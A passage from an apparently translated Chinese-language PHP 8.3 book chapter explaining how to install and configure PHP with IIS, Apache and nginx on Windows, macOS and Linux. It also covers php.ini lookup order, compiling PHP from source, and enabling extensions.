- 作为 SAPI 模块：这种连接类型更直接，但并非所有 Web 服务器都实现了它。不过，PHP 为最重要的 Web 服务器 Apache 提供了 SAPI 模块。另一方面，对于来自 Microsoft 的 IIS Windows Web 服务器，现在只推荐下一个选项。

¹ 严格来说，它不是解释器，而是编译器。

- 作为 CGI：通用网关接口是实现 Web 服务器服务器端编程的第一批方法之一。在早期，CGI 几乎等同于 Perl。PHP 可以在几乎所有 Web 服务器上作为 CGI 模块执行。FastCGI（fastcgi.com 网站已不活跃，但 https://fastcgi-archives.github.io 有存档副本）是 CGI 的扩展，提供更好的性能，并现在几乎被普遍接受。这是首选变体，尤其是在 Windows 下。

![](img/ae7820c36e8f24c1623d26668b28e80e_44_0.png)

图 2.1 将 PHP 集成到 Web 服务器中至关重要

SAPI 和 CGI 两种变体都随 PHP 一起提供。你可以从其官方主页 www.php.net 获取 PHP。PHP 提供源代码形式。当然，这必须首先被编译。在 Linux 中这是相当常见的做法，但大多数 Linux 发行版也提供现成的 PHP 包（例如 RPM 或 DEB 文件）。对于 Windows，还有二进制文件——即已编译版本——你可以更方便地安装。

> **注意**
> 由于版本号的微小变化通常包含安全更新，你应该定期更新测试系统。但是，你的（自有或租用的）Web 服务器上的版本号是决定性的。顺便说一下，每次版本变更时，你都应首先查看最重要的更改，即所谓的更改日志。有时函数的行为会发生变化，你需要在脚本中进行调整，或者 php.ini 配置文件中会添加新的安全设置。

自动安装程序也促进了 PHP 的普及。它们为 Windows 提供了包含 Apache 和 MySQL 或 MariaDB 的包；对于 Linux，有各种版本的 RPM 或 DEB 包可用。安装程序非常实用，这就是我们将介绍其中一些的原因。不过，手动进行安装也没有坏处。你的优势在于可以更轻松、更快速地更新 PHP。

### 2.1.1 PHP 的结构

在接下来的各节中阅读更多关于在不同操作系统上安装 PHP 的内容之前，仔细了解 PHP 的结构很重要。

PHP 的起点是 SAPI 或 CGI 模块。然后所有设置都存储在 php.ini 文件中。这个文本文件是重要设置的关键点。配置文件中的一个设置也称为指令。

> **注意**
> PHP 是一种脚本语言，也可以在控制台中工作。这个控制台版本包含在安装包中，也称为命令行接口（CLI）版本。你可以在 www.php.net/manual/features.command-line.php 上了解更多相关信息。

如果 PHP 作为模块安装，Web 服务器加载时 PHP 会调用 php.ini 文件。使用 CGI 版本或控制台版本时，每次调用都会包含 php.ini。在 Linux 上，它默认位于 /usr/local/lib 目录中。但是，你应该在编译 PHP 时通过以下设置更改此位置：

```
--with-config-file-path=/etc
```

etc 文件夹是 Linux 下配置文件的标准文件夹，因此通常是最佳选择。你必须重命名 PHP 提供的 php.ini 模板文件之一（php.ini-development 和 php.ini-production）为 php.ini，并将其移动到此文件夹中以便在那里使用。

在 Windows 下，PHP 也提供两个 php.ini 模板文件。必须将其中一个重命名为 php.ini。默认情况下，php.ini 位于 PHP 程序目录（对我们而言为 C:\php）。如果存在多个 php.ini，首先使用哪个取决于 PHP 自身的搜索顺序² 以下是 Windows 中的顺序：

- 仅适用于 Apache 2 及更高版本：`httpd.conf` 中 PHPIniDir 指令指定的目录
- 注册表项中的路径：`HKEY_LOCAL_MACHINE\SOFTWARE\PHP\IniFilePath`
- 环境变量或系统变量 `PHPRC`
- `PHP-CLI` 的目录或 Web 服务器 SAPI 模块的目录（仅在 Apache 中正常工作）
- Windows 目录（`C:\Windows`）—但不推荐，因为用户通常不应写入此目录，但你肯定会不时更改 `php.ini`

² 使用 phpinfo() PHP 函数来确定正在使用哪个 php.ini 文件。相关信息可在顶部的“配置文件 (php.ini) 路径”下找到。




注
*php.ini* 中的设置可以在 www.php.net/manual/ini.php 找到。然而，在本书中，有一个单独章节专门介绍 *php.ini*（第 34 章）。

### 2.1.2 Windows

现成的 Windows 版 PHP 的存在是 PHP 早期成功的关键因素之一。当然，主机主要使用 Linux 和 Apache³ 作为其 Web 服务器，但大多数业余和专业开发人员仍在家用电脑上使用 Windows。与此同时，使用 XAMPP 等现成软件包进行安装是一种可靠且流行的替代方案。本章还包含手动安装说明。

3 因此有著名的 LAMP 缩写，代表 Linux、Apache、MySQL 和 PHP。

注
本书原版基于 PHP 8.3.0 最终版本。PHP 8.4.0 在制作英文版本书后期发布。我们添加了若干对 PHP 8.4.0 的引用，但重点仍放在 PHP 8.3 上。

### Web 服务器

Windows 上可以使用各种 Web 服务器。最重要的是：

- *互联网信息服务* (IIS; 参见图 2.2) 是微软提供的“专业”Web 服务器。它随大多数 Windows 版本提供。

![](img/ae7820c36e8f24c1623d26668b28e80e_46_0.png)

图 2.2 已安装 IIS

您可以在 Windows 10/11 的“打开或关闭 Windows 功能”中检查是否已安装。

如果缺少 IIS，请单击它。双击以打开更多选项。重要的是，ISAPI 和 CGI 也应在“应用程序开发功能”下安装。

- Apache for Windows 是市场领先 Web 服务器的 Windows 移植版。最新版本属于 2.x 分支。两个版本的二进制文件可在 https://httpd.apache.org 上找到，PHP 项目还正式推荐在 https://www.apachelounge.com/download 上下载。

如果已安装 Web 服务器，通常可以通过 http://localhost/ 或 http://127.0.0.1/ 在本地访问它。本书中所有 PHP 示例都位于 php 子文件夹中。其 URL 如下：

```
http://localhost/php/
```

如果为 Web 服务器使用非默认端口 80 以外的端口，还必须指定端口：

```
http://localhost:8080/php/
```

### 安装包

由于 Apache、PHP 和 MySQL（或 MariaDB）通常一起使用，一些项目提供自动安装程序。一大优点是您可以再次卸载整个安装包。但是，有些包在较新的 PHP 版本方面略有滞后，尤其是 PHP 8.3（尽管从写下这些行到您阅读它们之间可能发生了很多事情）。以下是我们认为目前最好的三个安装包：

- XAMPP 无疑是最著名的项目（https://www.apachefriends.org/index.html）。它的巨大优势在于适用于 Linux、Windows 和 macOS。安装不仅包含所有扩展，还包含可直接使用的 PEAR。4 它也会非常定期地更新。您还可以在 http://sourceforge.net/projects/xampp/files 上找到旧版本。XAMPP 的配置对生产环境并非最佳，因此主要用作本地开发平台。不过，该项目尚未针对 PHP 8.3 进行更新（参见图 2.3）。顺便说一句，XAMPP 安装的是 MariaDB 而不是 MySQL，这最初没有显著的功能影响。

- EasyPHP Devserver（www.easyphp.org）既可用于开发也可用于生产环境。使用此包，PHP 版本非常容易配置，还可以安装附加包。（出版时，当前版本 17.0 中仅包含 PHP 7；不过，PHP 8.3 可作为附加组件进行安装。）

- 最初源自法国的 WampServer 项目（https://www.wampserver.com/en）也颇为知名。（出版时，已支持 PHP 8.3。）

4 有关详细信息，请参阅第  节。

![](img/ae7820c36e8f24c1623d26668b28e80e_48_0.png)

图 2.3 XAMPP 尚未支持 PHP 8.3（写作时）

> **注**
> 
> 例如，如果 IIS（或其他 Web 服务器）已经在端口 80 上运行，并且您使用的自动安装程序也将 Apache 设置为端口 80，则可能会出现问题。在这种情况下，必须停止其他 Web 服务器或将 Apache 设置为不同的端口。对于 Apache，这是在 `httpd.conf` 配置文件中完成的，该文件位于 `conf` 文件夹中。

### 手动安装

现在我们来讨论手动安装。但是，本节解释的基本原理和程序也适用于您希望使用包对安装进行更改的情况。此处按 Web 服务器进行细分。

对于生产系统——即连接到互联网并在此执行工作的 Web 服务器——在 90% 的情况下，手动安装是唯一合适的方法。处理 `php.ini` 中的配置设置时需要格外小心。大多数安装程序或安装包以 `php.ini` 中过于宽松的设置开始，这些设置不适合生产系统。

以下安装说明基于尚未安装 PHP 的系统。此处展示的变体基于 PHP 在线文档中的新说明，因为这提供了最佳且最快的可更新性。PHP 仅集中保存在一个文件夹中，而在之前的安装中，php.ini 文件总是最终位于 Windows 目录中，其他扩展必须也复制到那里，或者（不推荐）复制到 System32。

> **注**
> 对于 IIS，CGI 变体推荐使用 PHP 的非线程安全 (NTS) 版本。通常，出于性能原因，几乎专用于 FastCGI 版本。

要安装 PHP，请执行以下步骤：

- 1. 下载包含 PHP 8.3 Windows 二进制文件的 ZIP 文件。Windows 下载页面位于 [Windows 下载页面](http://windows.php.net/download)。必须使用非线程安全版本，并决定其应在 x86 还是 x64 系统上运行。您还需要 Visual C++ Redistributable for Visual Studio 2019 包（针对 PHP 8.4 则为 Visual C++ Redistributable for Visual Studio 2022）才能运行 PHP——这一点在下载页面有一个小而易被忽略的注释中注明。您可以在 [Visual C++ Redistributable](http://s-prs.co/v602204) 上找到它，在此处必须选择也要安装 PHP 的处理器架构（32 位或 64 位）。
- 2. 为 PHP 创建一个新文件夹。此处假设的默认路径为 C:\\php。
- 3. 将 ZIP 文件的内容解压到此文件夹中。注意：ZIP 不再自动包含 php 文件夹！这就是我们在上一步中创建它的原因。
- 4. 下面是简要清单：PHP 的 CGI 版本称为 php-cgi.exe，而非 php.exe。后者 php.exe 是控制台版本，默认已位于 PHP 主文件夹中。SAPI 文件是 php8.dll。不过，如前所述，它不再推荐用于 IIS。如前所述，php.ini 文件仅在标准包中以两个模板形式提供：php.ini-development 和 php.ini-production。前者更多用于测试系统，后者用于生产系统。不过，您通常需要自行修改。
- 5. 将提供的两个 php.ini 模板文件之一重命名为 php.ini。
- 6. 在下一步中，应让 Windows 明确 php-cgi.exe PHP 模块和 php.ini 位于主 PHP 目录中（此处：C:\\php）。虽然这并非绝对必要，但通常能简化控制，尤其是在与扩展配合使用时。此步骤需要设置一个新环境变量：
  - 通过“控制面板” • “系统” • “系统和安全” • “高级系统设置”切换到环境变量。
  - 在“环境变量” • “系统变量”下编辑 Path 条目。




- 添加 PHP 目录——例如，C:\php。
- 为 php.ini 创建一个新的系统变量。该变量必须适用于带有用户管理的 Windows 操作系统，而不仅仅是当前用户。
- 环境变量名为 PHPRC，目录为 php.ini 所在的目录——例如，C:\php（见图 2.4）。
- 最后，保存或确认更改并重启操作系统。

![](img/ae7820c36e8f24c1623d26668b28e80e_50_0.png)

图 2.4 添加其他路径以确保找到 PHP 模块

现在通过 inetmgr.exe 启动 IIS 管理控制台。

- 7. 单击“处理程序映射”。
- 8. 然后在右侧选择“添加模块映射”。
- 9. 在图 2.5 所示的对话框中，将“*.php”——或要与 PHP 关联的其他文件扩展名——作为请求路径输入。

![](img/ae7820c36e8f24c1623d26668b28e80e_50_1.png)

图 2.5 作为 CGI 的 PHP 设置

- 10. 将 **FastCgiModule** 选为 **模块**。

- 11. 可执行文件是 *php-cgi.exe* CGI 文件。

- 12. 将以下配置设置添加到 *php.ini*（并替换任何现有且不同的设置）。最后一项设置尤其重要，否则默认值 1 会阻止直接调用 PHP CGI 模块，导致 IIS 出现错误：

```
fastcgi.impersonate = 1
fastcgi.logging = 0
cgi.fix_pathinfo = 1
cgi.force_redirect = 0
```

错误的常见原因是尚未设置 CGI。您必须通过 **“启用或关闭 Windows 功能”** 下的安装来检查此项。

为此，请转到 **“应用程序开发功能”**（见图 2.6），如有疑问，请在此处安装 **CGI**。可能还需要为 CGI 角色授予应用程序开发的相应权限。

![](img/ae7820c36e8f24c1623d26668b28e80e_51_0.png)

图 2.6 安装 CGI 支持

在 <https://www.php.net/install.windows>，您可以在在线手册中找到 Windows 上 PHP 的进一步设置选项，以及有关 PHP 与 IIS 组合的信息。

## 在版本之间切换

一些开发者希望或需要在系统中同时使用不同的 PHP 版本。使用 XAMPP 等安装包可以非常轻松地快速切换。不过，手动安装时也有一些小技巧能让生活更轻松：

- 1. 为 C:\php 文件夹创建环境变量。
- 2. php.ini 也位于该文件夹中。两个 PHP 版本中的一个位于此文件夹，为另一个起个略有不同的名称，例如 C:\php8.4。
- 3. 现在更改非常简单：重命名这两个文件夹。例如，C:\php 变为 C:\php8.3。
- 4. 然后将 C:\php8.4 重命名为 C:\php。

就这么简单。相应版本的 .ini 文件始终用作 php.ini。扩展也会自动复制。这样可以轻松管理两个或更多版本。

## Apache 2.x

使用 Apache 2.x 时安装非常简单。此处可找到 PHP 8.x 和 Apache 2.4 的说明，不支持旧版 Apache。PHP 作为 SAPI 模块（也称为处理程序）安装。

- 1. 对于 Windows 二进制文件，请选择线程安全版本以及与已安装 Web 服务器匹配的 x86 或 x64 版本。不要忘记来自 [http://s-prs.co/v602260](http://s-prs.co/v602260) 的 Visual Studio 2019 的 Visual C++ Redistributable。

**注意**
如果版本不匹配，安装将在此处失败。

- 2. 将二进制文件解压到 C:\php 目录中。

- 3. 重命名提供的两个 php.ini 版本中的一个为 php.ini。

- 4. 然后在 Apache 配置文件 httpd.conf 中进行配置。在标准安装中，它位于 C:\Apache24\conf\httpd.conf。对于 SAPI 模块，内容如下：

```
LoadModule php_module "C:/php/php8apache2_4.dll"
AddType application/x-httpd-php .php
PHPIniDir "C:/php"
```

**注意**
对于其他版本，您当然应该相应调整 dll 的版本号。如果不存在名为 php8apache2_4.dll 的文件，您可能下载了面向 IIS 的非线程安全 PHP 发行版。请改为选择线程安全版本。

- 5. 然后启动 Apache，例如通过命令提示符：

```
httpd.exe -k start
```

## 测试安装

要测试安装，请切换到文本编辑器并创建一个新的 PHP 文件。将此 PHP 文件保存为 phpinfo.php 或任何其他名称，放在 Web 服务器的根目录中（对于 IIS 默认在 C:\inetpub\wwwroot 下，对于 Apache 在程序目录的 htdocs 下，例如 C:\Apache24\htdocs）。

在该文件中仅编写三行代码：

```
<?php
phpinfo();
?>
```

第一行和最后一行是 PHP 代码的分隔符，用于告诉 PHP 解释器在哪里执行操作。phpinfo() 函数实际上是关键函数。它会生成关于 PHP 安装及所有已安装扩展的自报告（见图 2.7）。

![](img/ae7820c36e8f24c1623d26668b28e80e_53_0.png)

图 2.7 PHP 8 安装的 "phpinfo()" 输出（此处为 IIS 中的 FastCGI）

要立即测试，请在 Web 服务器上调用刚刚创建的 PHP 文件。在本例中，需要地址 `http://localhost/phpinfo.php`。这样可以同时检查 PHP 的基本功能及其与 Web 服务器的集成。如果有什么无法正常工作，php.exe 的控制台输出可能会提供更多信息（见图 2.8）。以下命令显示版本号：

```
php -v
```

![](img/ae7820c36e8f24c1623d26668b28e80e_54_0.png)

图 2.8 控制台上的 PHP

**注意**
在生产系统中，带有 phpinfo() 的文件不应从外部访问，因为它包含入侵者可能利用的系统信息。

## 自行编译

要在 Windows 上自行运行 PHP，需要来自 Microsoft 的 Visual Studio。此处将介绍 PHP 8.3 的过程，它需要 Visual Studio 2019 版本。PHP 8.4 使用 Visual Studio 2022。

Microsoft 在 http://s-prs.co/v602261 提供所谓的开发环境社区版。这对大多数用户是免费的，5 编译也可以使用它。安装过程中，只需确保安装了 PHP 所需的编译器（默认情况下未安装）。选择自定义设置，并在“编程语言” • “Visual C++” • “Visual C++ 2019 的常规工具”下激活复选框。在较新版本的 Visual Studio 2019 中，您会在单独组件列表中找到所需的相应生成工具（见图 2.9）。

**注意**
早期版本的 PHP 依赖于旧版本的 Visual Studio。仅 PHP 8.0 到 8.3 需要 Visual Studio 2019。但是，过程是相似的。PHP wiki 在 http://s-prs.co/v602205 提供有关旧版本（直到包括 7.1）的更多信息。页面 http://s-prs.co/v602206 涵盖 PHP 7.2 及更高版本。

5 详细信息可在 http://s-prs.co/v602207 上找到。注意：您绝对需要适用于 Windows 的 Visual Studio，而不是 macOS 版本，也不是同名但完全不同的 Visual Studio Code。

![](img/ae7820c36e8f24c1623d26668b28e80e_55_0.png)

图 2.9 安装适用于 VC++ 的最新工具集至关重要（“单独组件”选项卡）

开发环境包含您所需的几乎所有内容。过去，您还需要安装 Windows 软件开发工具包。现在不再需要。相反，有一个特殊的 PHP SDK，它在 GitHub 上托管 PHP 项目。项目 URL 是 https://github.com/php/php-sdk-binary-tools。

PHP 的大致编译步骤如下：

- 安装 PHP SDK
- 准备目录结构
- 导入当前 PHP 源代码
- 编译

那么，让我们开始吧。如果可能，您还需要 Git 来轻松获取 PHP SDK 和 PHP 本身的源代码。如果您不想使用 Git，也可以从各自的项目页面将这些包作为 ZIP 存档获取并解压。但是，我们将在后面使用 Git 版本，并假设您的系统已相应配置。

在 Visual Studio 2019 的开始菜单文件夹中，您会找到 **“VS 2019 的开发者命令提示符”**。这将打开一个命令提示符，其中大多数所需工具的路径已正确设置。

以下命令检索 PHP SDK 的当前源代码，将其解压到 C:\php-sdk 目录，然后检索至少版本 2.2.0：

```
git clone https://github.com/php/php-sdk-binary-tools.git c:\php-sdk
```




出版时这是最新的非测试版本（我们后面将使用开发状态 2.2.1-dev）。在你阅读本章时，很有可能已经有更新的版本可用。只需查看 PHP SDK GitHub 页面上的 Releases 选项卡即可。特定选择某个版本（例如 `git checkout php-sdk-2.2.0`）的优势在于，你实际使用的是作为 "release" 发布的版本，而不是当前快照。

接下来，切换到 C:\php-sdk 文件夹并为编译准备文件系统（参见图 2.10）。接下来我们将使用 64 位版本；如果要将 PHP 作为 32 位应用程序使用，请将 x64 替换为 x86：

```
cd c:\php-sdk phpsdk-vs16-x64.bat
phpsdk_buildtree.bat phpmaster
```

不要惊讶：第二个批处理脚本位于 bin 子文件夹中，但可以从 C:\php-sdk 调用，因为第一个批处理脚本会相应地调整当前控制台窗口中的 PATH 环境变量。

![](img/ae7820c36e8f24c1623d26668b28e80e_56_0.png)

图 2.10 帮助脚本准备系统

接下来，我们需要 PHP 本身的源代码。你可以从项目的 Git 仓库克隆它（我们后面将这样做），也可以从 http://php.net/downloads.php 下载相应的归档文件，并将其解压到 C:\php-sdk\phpmaster\vs16\x64\php-src 文件夹：

```
git clone https://github.com/php/php-src.git
```

（如果需要，如果你需要 32 位版本，请再次将 x64 替换为 x86。）

我们还没有达到目标，因为仍然缺少所有必需的库。它们曾经可以作为 7z 归档文件在 PHP 网站上下载，但如今获取所需内容更加方便：`phpsdk_deps.bat` 脚本会自动获取所需的包。在存放源代码的文件夹中调用它。我们使用 PHP 的 `master` 分支，但你也可以指定任何其他 `branch`；6

```
cd php-src
phpsdk_deps.bat --update --branch master
```

这些下载和复制步骤相当多。但多亏了现成的批处理文件，一切应该都能无误运行。现在是时候开始真正的工作了！

首先运行 `buildconf` 脚本。这会创建一个配置脚本，PHP 将基于该脚本进行编译。在下一步中，调用 `configure` 并指定你想要创建哪些扩展。在 `http://s.php.co/v602262` 有完整列表，但以下调用对于初次测试已经足够：

```
configure --disable-all --enable-cli
```

最后，启动实际的编译过程：

```
nmake
```

这需要一些时间（参见图 2.11）。然而，最后你将获得 PHP 的二进制版本。如果你还使用了 `--enable-debug` 开关，结果将在 `Debug_TS` 文件夹中；否则，它将在 `Release_TS` 中。

> **注意**
>
> 你可以在图 2.12 所示的输出中看到，使用的 PHP 版本是 8.4.0-dev。这是怎么可能的，因为这本书是关于 PHP 8.3 的（并在其发布后不久定稿）？
>
> 答案很简单：PHP 8.3 发布后，PHP 团队名义上开始着手开发下一个主要版本 PHP 8.4。因为我们直接从 Git 获取了源代码，所以我们拥有最新版本，因此也是 8.4。由于 PHP 8.4 已经发布，你可能会看到 8.5.0-dev 版本。但不要过于兴奋：至少在出版时，这些版本几乎是一样的。
>
> 但是，如果你想编译特定的 PHP 版本，请在调用 `phpsdk_deps.bat` 时指定特定分支，如前面所述。

![](img/ae7820c36e8f24c1623d26668b28e80e_58_0.png)

图 2.11 PHP 正在编译 ...

![](img/ae7820c36e8f24c1623d26668b28e80e_58_1.png)

图 2.12 ... 并且它可以工作！

## 扩展

在 Windows 下，扩展安装在 `php.ini` 中。首先，扩展目录很重要。你使用 `extension_dir` 指令来设置它。在 PHP 中，你将在 `ext` 目录中找到扩展：

```
extension_dir = "ext"
```

许多扩展不包含在标准包中，而是在各自的 PECL 包中。PECL 是用 C 编写的扩展的官方目录（参见 [http://pecl.php.net](http://pecl.php.net)）。如果你已正确输入扩展目录，则只需注册扩展本身。自远古以来，这总是按照以下模式进行：

```
extension=php_name.dll
```

自 PHP 7.3 起，还有一种简写形式，免去了 `php` 和 `.dll`。其优势在于，配置的这部分因此与操作系统无关：

```
extension=name
```

随安装提供的大多数扩展已经写入 `php.ini`（参见图 2.13）。但是，它们仍然被分号注释掉：

```
;extension=exif
```

只需删除行前的分号即可启用扩展。如果你重启 Web 服务器（作为 CGI 模块使用时，重新调用一次即可），你将通过 `phpinfo()` 看到新扩展现已注册。

![](img/ae7820c36e8f24c1623d26668b28e80e_59_0.png)

图 2.13 “php.ini” 文件中的扩展

## 刷新

最终，剩下的就是保持系统安全。为此，最重要的是要定期使用 Windows Update（参见图 2.14）。

![](img/ae7820c36e8f24c1623d26668b28e80e_60_0.png)

图 2.14 Windows Update 更新操作系统和其他组件

然而，仅此还不够。即使你使用 Apache 或其他 Web 服务器，也应始终保持其最新状态。对于生产系统，php.ini 中的设置对安全性也至关重要。最后但同样重要的是，PHP 版本也应当保持相对最新。

### 2.1.3 macOS

macOS 用户（曾称 OS X）让 PHP 运行起来特别容易。例如，安装 Web 服务器这一最初有时繁琐的步骤已不再必要，因为 macOS 默认包含 Apache 服务器。但出于明显原因，它默认处于禁用状态。

没有用于设置和启动该 Web 服务器的内置 UI；你必须改用命令行。这取决于你使用的是现代 macOS 版本（至少 Monterey 或 macOS 10.12）还是旧版本。在后一种情况下，打开终端窗口并启动 Apache Web 服务器：

```
sudo apachectl start
```

Web 服务器有两个根目录。全局根目录位于 /Library/WebServer/Documents；那里的文件可通过 http://localhost/filename 访问。对于用户级别的 Web 文件夹，你必须先在用户目录中创建一个 sites 文件夹，然后配置服务器。在 http://s-prs.co/v602263，你可以找到 macOS Big Sur 的完整说明（也包含早期版本的链接），这里我们向你推荐该页面。

接下来，你需要 PHP。不幸的是，PHP 项目不为 Mac 提供官方二进制文件，但 PHP 已包含在 macOS 中（尽管通常是旧版本）。不过，你需要通过编辑 /private/etc/apache2/httpd.conf 文件来启用它——例如，使用以下命令（参见图 2.15）：

```
sudo nano /private/etc/apache2/httpd.conf
```

![](img/ae7820c36e8f24c1623d26668b28e80e_61_0.png)

图 2.15 编辑“httpd.conf”文件以激活 macOS 自带的 PHP

该文件包含以下行：

```
#LoadModule php7_module libexec/apache2/libphp7.so
```

是的，这实际上是 PHP 7 版本。你必须删除行首的井号（注释字符）。重启服务器后，PHP 即可使用：

```
sudo apachectl graceful
```

> **注意**
>
> 在旧版 macOS 中，httpd.conf 文件包含其他与 PHP 相关的内容。其中，你必须确保带有 .php 扩展名的文件也由 PHP 处理。请参阅 http://s-prs.co/v602264 中的步骤 2 和尤其是步骤 3。





但是，如前所述，所提供的 PHP 版本并非最新版本（在较新的 macOS 版本中，例如 7.3.x——系统还附带一条说明，称其将在未来版本中不再可用；请参见图 2.16）。但这里也有一个方便的变通方法。

![](img/ae7820c36e8f24c1623d26668b28e80e_62_0.png)

图 2.16 PHP 已包含在 macOS 中，但已过时，且将不会长期包含

我们在这里说的是替代包管理器 Homebrew（https://brew.sh）。必须先安装它：

```
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

brew 命令行工具随后即可使用（除此之外）。如果你的系统上还没有最新的 Apache Web 服务器，可以使用 Homebrew 对其进行补救：

```
brew install httpd
brew services start httpd
```

然后继续使用你选择的脚本语言。以下说明成功安装了 PHP 8.3（请参见图 2.17 和图 2.18），未来版本的操作方式应相同：

```
brew install php@8.3
```

![](img/ae7820c36e8f24c1623d26668b28e80e_63_0.png)

图 2.17 通过 Homebrew 在 macOS 上安装 PHP 期间

![](img/ae7820c36e8f24c1623d26668b28e80e_63_1.png)

图 2.18 安装成功

**注**

在较新版本的 macOS 中，将 PHP 集成到提供的 Apache Web 服务器不再那么简单。例如，扩展必须经过特殊签名才能执行。一种常见的做法是停用捆绑版本，并（同样通过 Homebrew）安装最新的 Apache 版本。有关此内容以及在 macOS 下处理多个并行 PHP 版本的详细信息，请参阅 [http://s.prs.co/v602208.](http://s.prs.co/v602208.)

**注**

Homebrew 工作得很好，但由于组件是在目标系统上编译的，因此可能会占用大量内存。对于较旧版本的 macOS，仍在维护的替代方案是 MacPorts 项目（[https://macports.org](https://macports.org)）。安装基本软件包后，以下命令会在系统上设置 PHP：

`sudo port install php`

即使 macOS 的市场份额相对较小（桌面端约为 20%），也不意味着不存在安全漏洞或没有人想要利用它们。出于这个原因，这里也适用同样的规则：尽早且经常地更新。macOS 默认配置为在固定间隔自动启动系统更新（请参见图 2.19）。你不一定应该更改此设置。

![](img/ae7820c36e8f24c1623d26668b28e80e_64_0.png)

图 2.19 macOS 下已安装程序及 macOS 本身的更新

### 2.1.4 Linux

在 Linux 下，预构建软件包 7 不如 Windows 安装程序对 PHP 那么重要。经典的“手动安装”是让 PHP 运行并包含所需所有扩展的最重要方式。因此，安装过程受到的异常和问题要少得多。一旦你内化了基本原理，每次操作都相同。这里我们使用 Apache 和 nginx 作为 Web 服务器。

### 发行版

大多数 Linux 发行版已预装 Apache，并且在大多数情况下也包含 PHP 支持。例如，在某些（较旧的）Ubuntu 版本中，你会在包管理器中找到安装选项。然后只需在运行级别编辑器中激活 Web 服务器，即可完成。

在较新的发行版和版本中，最好使用命令行：

```
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install apache2 php libapache2-mod-php
```

前两个命令更新包管理器的软件列表和已安装的软件包，然后最后安装 Apache、PHP 以及 Apache 2 的 PHP 模块。

这些自动化机制的问题是，Linux 发行版的更新频率低于 PHP。因此，版本有时（略有）过时；例如，在出版时，最新的长期支持（LTS）Ubuntu 版本仅提供 PHP 8.1。你对编译设置的控制也较少，但它们肯定适合作为基础。

> **提示**
> 
> 如果 Ubuntu 太慢，Ondřej Surý 可以提供帮助。他可靠且及时地为受支持的 PHP 版本发布软件包。如果你激活他的存储库，就可以提前获取新版本：
> 
> sudo add-apt-repository ppa:ondrej/php
> sudo apt update

另一个流行的 Web 服务器，现在市场份额甚至高于 Apache，是 nginx。你也可以为该服务器安装 PHP 支持，如后面所述。在出版时，起点是前面方框中提到的 Ondřej Surý 的存储库。如果尚未安装，请先安装 nginx：

```
sudo apt-get install nginx
```

7 对于其他 Unix 系统，PHP 在线文档提供了有用的说明。我们在此不得不划定界限，因为书籍媒介不提供足够的更新周期和空间来容纳此类及时且细致的信息。

接下来，不要使用“常规”PHP 包，而是使用 FPM 包。FPM 在这里代表 FastCGI 进程管理器，提供与 Web 服务器一样出色的性能：

```
sudo apt-get install php8.3-fpm
```

微调是在文件 /etc/nginx/sites-enabled/default 中完成的，其中已有（注释掉的）PHP 集成设置，可能基于旧版 PHP。以下说明适用于 PHP 8.3：

```
location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.3-fpm.sock;
}
```

最后，在 /var/www/html 文件夹中创建一个名为 phpinfo.php 的文件，内容如下：

```
<?php
phpinfo();
?>
```

现在使用 sudo systemctl restart nginx 快速重启服务器，之后 http://localhost/phpinfo.php 应该会显示类似图 2.20 所示的输出。

![](img/ae7820c36e8f24c1623d26668b28e80e_66_0.png)

图 2.20 PHP 也可在 nginx 上运行

**提示**
PHP FPM 包也可以轻松集成到 Apache 中。通过 apt-get 安装 php8.3-fpm 后，需要以下两个命令：
a2enmod proxy_fcgi setenvif
a2enconf php8.3-fpm

### 安装软件包

在 Linux 的现成安装包中——与 Windows 一样——应该提到 XAMPP。安装相当简单：

- 1. 从 https://www.apachefriends.org/download.html 下载软件包。
- 2. 运行安装程序。这是一个 .run 文件。它需要执行权限，然后其余部分几乎自动运行。更改版本名以适应你的系统：

```
chmod 755 xampp-linux-x64-8.2.12-0-installer.run
sudo ./xampp-linux-x64-8.2.12-0-installer.run
```

图 2.21 显示安装程序。

![](img/ae7820c36e8f24c1623d26668b28e80e_67_0.png)

图 2.21 Linux 上的 XAMPP 安装程序

- 3. 安装后启动：

```
/opt/lampp/lampp start
```

XAMPP 默认安装在 Linux 下的 /opt 文件夹中。

### 手动安装

在 Linux（以及非常类似的 macOS）中进行手动安装，实际上不需要太多知识。整个过程只需几个步骤即可完成。但是，首先你的系统上需要以下程序，其中大部分包含在 Apple 开发环境 Xcode 中：

- 像 `gcc` 这样的 C 编译器
- `autoconf`，用于创建配置脚本的软件
- `bison`，GNU 解析器生成器
- `flex`，用于词法分析的生成器
- `libtool`，库的支持脚本
- `re2c`，词法分析器生成器

如果你使用发行版的标准安装，上述程序要么可用，要么可以从交付范围中安装。对于这些安装说明，你需要一个 Apache Web 服务器。获取方法如下（如果你的发行版使用不同的包管理器，请相应调整命令）。重要的是，你还需要安装 `apache2-dev` 包：

```
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install apache2
sudo apt-get install apache2-dev
```

如果你安装 PHP 未包含的扩展，还需要相应的库。这些库是什么可以在本书的相应章节中找到。

如果一切就绪，以下步骤将引导你达成目标：

- 1. 下载 PHP 8.3.x 的源代码。这里假设为 tar.gz。
- 2. 解包源代码。请注意，文件名会随版本号更改！在此情况下，目录 `/usr/local/src/lamp` 可根据需要自定义，只要当前用户对其具有写入权限：

     tar xvfz php-8.3.2.tar.gz -C /usr/local/src/lamp/
- 3. 切换到目录：

     cd /usr/local/src/lamp/php-8.3.2/

     你可能需要调整目录和 PHP 版本。
- 4. 现在是“最困难”的步骤，即配置。在这里你可以指定配置 PHP 所需的所有选项。还要配置你想要使用的所有扩展。要包含 Apache，请使用 `-with-apxs2[=file]`，其中 file 指定 `apxs` Apache 工具的路径。它通常位于 `bin` 目录中。



Apache 安装目录或 /usr/bin（通过 `which apxs` 调用可以查看路径）。否则，PHP 仅作为 CGI 模块生成：

```
./configure --with-apxs2=/Path/bin/apxs --with-mysql
```

你可以在图 2.22 中看到所需结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_69_0.png)

图 2.22 Configure 已顺利运行——这是个好兆头！

> **注意**
> 
> 你可以使用 ./configure --help 显示所有选项列表。扩展的必要设置可以在本书每章开头找到。摘要包含在在线文档 http://s.php.co/v602265 中。
> 
